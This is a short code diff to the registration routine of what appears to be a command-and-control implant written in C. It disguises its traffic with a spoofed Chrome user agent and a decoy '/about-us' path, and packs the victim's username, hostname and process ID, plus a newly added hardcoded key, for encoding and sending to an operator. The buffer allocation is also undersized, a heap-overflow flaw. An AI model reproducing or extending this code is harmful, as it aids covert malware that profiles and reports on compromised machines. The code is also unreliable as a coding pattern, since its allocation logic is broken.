@@ -15,6 +15,7 @@ struct agent_information {
     CHAR *user_agent;
     INT port;
     CHAR *path;
+    CHAR *key;
 }agent;
 
 void Registration() {
@@ -25,11 +26,12 @@ void Registration() {
     agent.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36";
     agent.port = 8080;
     agent.path = "/about-us";
+    agent.key = "boondoggle";
 
-    CHAR *format = "%s\n%s\n%d\n%d";
+    CHAR *format = "%s,%s,%d,%d,%s";
     
-    CHAR *data_to_encode = malloc(strlen(format) + strlen(job.username) + strlen(job.hostname));
-    sprintf(data_to_encode, format, job.username, job.hostname, job.process_id, job.version);
+    CHAR *data_to_encode = malloc(strlen(format) + strlen(job.username) + strlen(job.hostname) + strlen(agent.key));
+    sprintf(data_to_encode, format, job.username, job.hostname, job.process_id, job.version, agent.key);
 
     CHAR *data_encode = malloc(strlen(data_to_encode));
     DWORD data_encode_len = strlen(data_to_encode) * 2;
